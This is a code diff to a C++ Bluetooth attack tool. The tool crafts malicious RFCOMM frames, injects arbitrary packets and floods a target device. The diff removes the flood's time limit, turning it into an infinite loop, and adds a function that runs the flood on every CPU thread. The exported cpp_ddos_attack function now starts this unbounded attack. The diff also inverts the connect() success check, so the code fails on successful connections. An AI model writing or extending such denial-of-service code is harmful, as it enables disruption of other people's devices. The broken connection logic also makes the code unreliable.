@@ -3,6 +3,8 @@
 #include <unistd.h>
 #include <cstring>
 #include <random>
+#include <thread>
+#include <vector>
 
 using namespace Bluetooth;
 
@@ -54,10 +56,11 @@ void PacketManipulator::craft_malicious_rfcomm(const bdaddr_t& target, uint8_t c
     addr.rc_channel = channel;
     bacpy(&addr.rc_bdaddr, &target);
 
-    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
+    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
         close(sock);
         throw std::runtime_error("RFCOMM connection failed");
     }
+
     uint8_t frame[1024];
     frame[0] = 0x03;
     frame[1] = 0xEF; 
@@ -85,14 +88,12 @@ void PacketManipulator::inject_packet(const bdaddr_t& target, const std::vector<
     }
 }
 
-void PacketManipulator::flood_device(const bdaddr_t& target, int packets_per_sec, int duration_sec) {
-    const auto start = std::chrono::steady_clock::now();
-    const auto end = start + std::chrono::seconds(duration_sec);
+void PacketManipulator::flood_device(const bdaddr_t& target, int packets_per_sec) {
     const auto interval = std::chrono::microseconds(1000000 / packets_per_sec);
     
     std::vector<uint8_t> dummy_packet(1024, 0xFF);
     
-    while (std::chrono::steady_clock::now() < end) {
+    while (true) {  // Infinite loop
         try {
             inject_packet(target, dummy_packet);
             std::this_thread::sleep_for(interval);
@@ -103,17 +104,35 @@ void PacketManipulator::flood_device(const bdaddr_t& target, int packets_per_sec
     }
 }
 
+// Start flooding on all CPU threads
+void PacketManipulator::start_flood_on_all_threads(const bdaddr_t& target, int packets_per_sec) {
+    unsigned int num_threads = std::thread::hardware_concurrency();
+    if (num_threads == 0) num_threads = 4;  // Default to 4 if detection fails
+
+    std::vector<std::thread> threads;
+    for (unsigned int i = 0; i < num_threads; ++i) {
+        threads.emplace_back([this, &target, packets_per_sec]() {
+            this->flood_device(target, packets_per_sec);
+        });
+    }
+
+    for (auto& thread : threads) {
+        thread.join();  // This will block forever, effectively making an infinite attack
+    }
+}
+
+// External C function
 extern "C" void cpp_modify_packets(const bdaddr_t* target_addr, const char* payload) {
     try {
         Bluetooth::PacketManipulator manip;
-        manip.inject_packet(*target_addr, 
-                          std::vector<uint8_t>(payload, payload + strlen(payload)));
+        manip.inject_packet(*target_addr, std::vector<uint8_t>(payload, payload + strlen(payload)));
     } catch (...) {}
 }
 
+// External C function to start attack
 extern "C" void cpp_ddos_attack(const bdaddr_t* target_addr, int duration_sec) {
     try {
         Bluetooth::PacketManipulator attacker;
-        attacker.flood_device(*target_addr, 500, duration_sec);
+        attacker.start_flood_on_all_threads(*target_addr, 500);
     } catch (...) {}
 }
